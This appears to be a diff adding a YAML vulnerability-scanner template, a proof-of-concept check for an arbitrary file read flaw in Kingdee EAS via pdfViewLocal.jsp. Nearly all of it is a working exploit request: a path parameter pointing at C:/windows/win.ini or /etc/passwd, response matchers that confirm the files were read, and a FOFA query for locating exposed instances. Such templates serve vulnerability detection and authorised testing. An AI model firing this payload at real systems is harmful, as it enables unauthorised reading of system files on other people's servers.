@@ -1,0 +1,20 @@
+id: poc-yaml-kingdee-eas-pdfviewlocal-jsp-anyfile-read
+info:
+  name: 金蝶EAS pdfviewlocal.jsp 任意文件读取漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 文件读取
+  finger: 金蝶 EAS
+  fofa: app="Kingdee-EAS"
+variables:
+  file: 'C:/windows/win.ini
+
+    /etc/passwd'
+requests:
+- method: GET
+  path: /plt_document/fragments/content/pdfViewLocal.jsp?path={{.file}}
+  expression: (status_code == 200 && contains(headers,"application/pdf")) && ( (contains(body,"[file]")
+    && contains(body,"; for 16-bit app support") && !contains(body,"<")) || (contains(body,"root:")
+    && contains(body,"/bin") && !contains(body,"<")) )
+transport: http
